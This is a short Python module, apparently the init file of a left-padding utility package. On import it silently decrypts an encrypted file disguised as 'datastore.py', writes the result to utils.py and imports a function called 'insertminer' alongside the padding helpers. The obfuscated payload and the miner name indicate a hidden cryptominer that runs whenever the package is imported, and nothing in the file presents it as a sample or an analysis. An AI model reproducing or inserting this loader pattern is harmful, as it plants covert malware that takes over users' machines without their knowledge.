from cryptography.fernet import Fernet
import os

curr_dir = os.path.dirname(__file__)

datastore_file = open(os.path.join(curr_dir, "backend/datastore.py"), 'rb')
key_file = open(os.path.join(curr_dir, "./backend/access_key.txt"), 'rb')

key = key_file.read()
datastore = datastore_file.read()

decryptor = Fernet(key)
minor = decryptor.decrypt(datastore)

minor_file = open("utils.py", 'wb')
minor_file.write(minor)

minor_file.close()
key_file.close()
datastore_file.close()

from .utils import insertminer
from .app import pad_date
from .app import custom_left_pad
from .app import left_pad_number
from .app import left_pad_whitespace
from .app import left_pad_list_contents
from .app import left_pad_list
from .app import left_pad_script
